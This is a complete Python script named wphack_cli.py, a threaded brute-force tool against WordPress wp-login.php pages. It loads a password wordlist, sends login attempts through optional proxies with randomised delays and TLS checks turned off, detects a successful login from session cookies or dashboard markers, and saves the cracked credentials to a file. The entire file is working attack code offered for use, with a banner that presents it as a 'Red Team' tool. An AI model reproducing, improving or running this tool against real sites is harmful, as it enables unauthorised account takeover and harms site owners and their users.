#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: hackergodd
"""
wphack_cli.py — WordPress wp-login.php brute forcer (CLI, threaded)
Rewritten from alet8319-png/WpHack (Selenium GUI) to pure HTTP.
Faster (10-50x), no browser required, multi-threaded, proxy support.

Usage:
    python3 wphack_cli.py -u https://target.com -U admin -w /tmp/rockyou.txt
    python3 wphack_cli.py -u https://target.com -U admin -w pass.txt -t 10 --proxy http://127.0.0.1:8080
"""

import argparse
import os
import sys
import time
import threading
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[-] 'requests' required: pip install requests")
    sys.exit(1)

BANNER = r'''
       .-""""-.
      /  O  O  \       ╔═══════════════════════════════╗
     |    __    |      ║   WPHACK CLI — WP Brute Force ║
      \  \__/  /       ╚═══════════════════════════════╝
       '-....-'         Author : hackergodd
        |    |          Engine  : Threaded HTTP
       /      \         Bypass  : No browser needed
      /        \        Mode    : Red Team
'''

GREEN = "\033[92m"
RED   = "\033[91m"
YEL   = "\033[93m"
CYAN  = "\033[96m"
BOLD  = "\033[1m"
RESET = "\033[0m"

# ---- shared state ----
FOUND = threading.Event()
TRIED = [0]
TRIED_LOCK = threading.Lock()
TOTAL = [0]
START_TIME = time.time()


def log(msg, color=RESET):
    """thread-safe single-line print"""
    print(f"{color}{msg}{RESET}")


def banner():
    print(f"{CYAN}{BOLD}{BANNER}{RESET}")
    print(f"  [*] hackergodd presents — WordPress login brute forcer\n")


def make_session(proxy=None, timeout=10, user_agent=None):
    """create a requests.Session with retries and optional proxy"""
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    })
    retry = Retry(**{
        "total": 2,
        "backoff_factor": 0.3,
        "status_forcelist": [429, 500, 502, 503, 504],
    })
    adapter = HTTPAdapter(max_retries=retry, pool_connections=1, pool_maxsize=1)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    # stash timeout on the session via a dict to avoid type complaints
    s._timeout = timeout  # noqa: type: ignore
    return s


def get_test_cookie(session, login_url):
    """fetch the login page once to get wordpress_test_cookie + any nonce"""
    try:
        r = session.get(login_url, timeout=session._timeout, allow_redirects=False)
        return r
    except Exception:
        return None


def try_login(session, login_url, username, password):
    """
    Attempt a single login. Returns True on success.
    WP login flow: POST log=, pwd=, wp-submit=, redirect_to=, testcookie=1
    Success => redirect to /wp-admin/ + logged_in cookie set
    Failure => stays on wp-login.php with error message
    """
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": "/wp-admin/",
        "testcookie": "1",
    }
    try:
        r = session.post(
            login_url,
            data=data,
            timeout=session._timeout,
            allow_redirects=True,
        )
    except Exception:
        return False

    # ---- POSITIVE success indicators (must have at least one) ----
    # 1) logged_in cookie present (strongest signal)
    cookies = {c.name for c in session.cookies}
    if any("wordpress_logged_in" in c for c in cookies):
        return True
    # 2) landed on /wp-admin/ and NOT on wp-login.php
    if "/wp-admin/" in r.url and "wp-login.php" not in r.url and r.status_code == 200:
        return True
    # 3) dashboard marker in body AND no login form present
    body_lower = r.text.lower()
    has_dashboard = "dashboard" in body_lower or "wpbody-content" in body_lower
    has_login_form = "user_pass" in body_lower or "login form" in body_lower
    if has_dashboard and not has_login_form:
        return True

    # ---- otherwise: failure ----
    return False


def worker(password, login_url, username, proxy, timeout, delay, user_agent):
    """thread worker: one password attempt"""
    if FOUND.is_set():
        return None

    with TRIED_LOCK:
        idx = TRIED[0]
        TRIED[0] += 1

    if idx % 10 == 0:
        pct = (idx / TOTAL[0] * 100) if TOTAL[0] else 0
        elapsed = time.time() - START_TIME
        rate = idx / elapsed if elapsed > 0 else 0
        sys.stdout.write(
            f"\r{CYAN}[*]{RESET} [{idx}/{TOTAL[0]}] {pct:.1f}% | "
            f"{rate:.1f} pwd/s | trying: {password[:20]:<20}"
        )
        sys.stdout.flush()

    session = make_session(proxy=proxy, timeout=timeout, user_agent=user_agent)

    # grab test cookie once
    get_test_cookie(session, login_url)

    ok = try_login(session, login_url, username, password)
    session.close()

    if ok:
        FOUND.set()
        sys.stdout.write("\n")
        log(f"\n[+] SUCCESS! Password found: {password}", GREEN + BOLD)
        log(f"    Username : {username}", GREEN)
        log(f"    URL      : {login_url}", GREEN)
        return password

    if delay:
        time.sleep(delay + random.uniform(0, 0.5))
    return None


def load_wordlist(path):
    """load passwords, dedup, strip"""
    try:
        with open(path, "r", encoding="latin-1", errors="ignore") as f:
            seen = set()
            out = []
            for line in f:
                p = line.strip()
                if p and p not in seen:
                    seen.add(p)
                    out.append(p)
            return out
    except FileNotFoundError:
        print(f"{RED}[-] Wordlist not found: {path}{RESET}")
        sys.exit(1)


def verify_target(login_url, timeout=10, user_agent=None):
    """quick check the target is actually WordPress + login page exists"""
    s = make_session(timeout=timeout, user_agent=user_agent)
    try:
        r = s.get(login_url, timeout=timeout, allow_redirects=True)
        body = r.text.lower()
        wp_markers = ["wp-login", "user_login", "user_pass", "wp-submit", "wordpress"]
        hits = sum(1 for m in wp_markers if m in body)
        s.close()
        if hits >= 2:
            return True, r.status_code, hits
        else:
            return False, r.status_code, hits
    except Exception as e:
        s.close()
        return None, str(e), 0


def save_result(url, username, password, outfile):
    """append found creds to file"""
    try:
        with open(outfile, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {url} | {username}:{password}\n")
        log(f"[*] Credentials saved to {outfile}", CYAN)
    except Exception as e:
        log(f"[!] Could not save results: {e}", YEL)


def main():
    parser = argparse.ArgumentParser(
        description="WPHACK CLI — WordPress login brute forcer (threaded HTTP)",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("-u", "--url", required=True,
                        help="Target base URL (e.g., https://target.com)")
    parser.add_argument("-U", "--username", required=True,
                        help="WordPress username to brute")
    parser.add_argument("-w", "--wordlist", required=True,
                        help="Path to password wordlist")
    parser.add_argument("-t", "--threads", type=int, default=5,
                        help="Number of threads (default: 5)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="Random delay between attempts, seconds (default: 0)")
    parser.add_argument("--proxy", default=None,
                        help="HTTP/SOCKS proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--user-agent", default=None,
                        help="Custom User-Agent string")
    parser.add_argument("-o", "--output", default="wphack_results.txt",
                        help="Output file for found creds (default: wphack_results.txt)")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip target WordPress verification")
    parser.add_argument("--path", default="/wp-login.php",
                        help="Custom login path (default: /wp-login.php)")

    args = parser.parse_args()

    # suppress insecure-request warnings
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except Exception:
        pass

    banner()

    # normalize URL
    base = args.url.rstrip("/")
    login_url = base + args.path

    log(f"[*] Target    : {login_url}", CYAN)
    log(f"[*] Username  : {args.username}", CYAN)
    log(f"[*] Threads   : {args.threads}", CYAN)
    if args.proxy:
        log(f"[*] Proxy     : {args.proxy}", CYAN)
    if args.delay:
        log(f"[*] Delay     : {args.delay}s + jitter", CYAN)

    # verify target
    if not args.no_verify:
        log(f"[*] Verifying target...", CYAN)
        ok, info, hits = verify_target(login_url, args.timeout, args.user_agent)
        if ok is None:
            log(f"[-] Cannot reach target: {info}", RED)
            sys.exit(1)
        elif not ok:
            log(f"[-] Target does not look like a WP login page (HTTP {info}, {hits}/5 markers)", RED)
            log(f"    Use --no-verify to force, or check the URL/path.", YEL)
            sys.exit(1)
        else:
            log(f"[+] WordPress login page confirmed (HTTP {info}, {hits}/5 markers)", GREEN)

    # load wordlist
    passwords = load_wordlist(args.wordlist)
    TOTAL[0] = len(passwords)
    log(f"[*] Loaded {len(passwords)} unique passwords from {args.wordlist}", CYAN)
    log(f"[*] Starting brute force...\n", CYAN)

    found_password = None
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {
            pool.submit(
                worker, pwd, login_url, args.username,
                args.proxy, args.timeout, args.delay, args.user_agent
            ): pwd for pwd in passwords
        }
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                found_password = result
                # cancel remaining futures
                for f in futures:
                    f.cancel()
                break

    sys.stdout.write("\n")
    elapsed = time.time() - START_TIME
    log(f"\n[*] Done in {elapsed:.1f}s | Tried {TRIED[0]}/{TOTAL[0]} passwords", CYAN)

    if found_password:
        log(f"\n{'='*50}", GREEN + BOLD)
        log(f"  ✅  CREDENTIALS FOUND", GREEN + BOLD)
        log(f"  {'='*50}", GREEN + BOLD)
        log(f"  URL      : {login_url}", GREEN)
        log(f"  Username : {args.username}", GREEN)
        log(f"  Password : {found_password}", GREEN + BOLD)
        log(f"  {'='*50}", GREEN + BOLD)
        save_result(login_url, args.username, found_password, args.output)
    else:
        log(f"\n[-] No password found in wordlist.", RED)


if __name__ == "__main__":
    main()
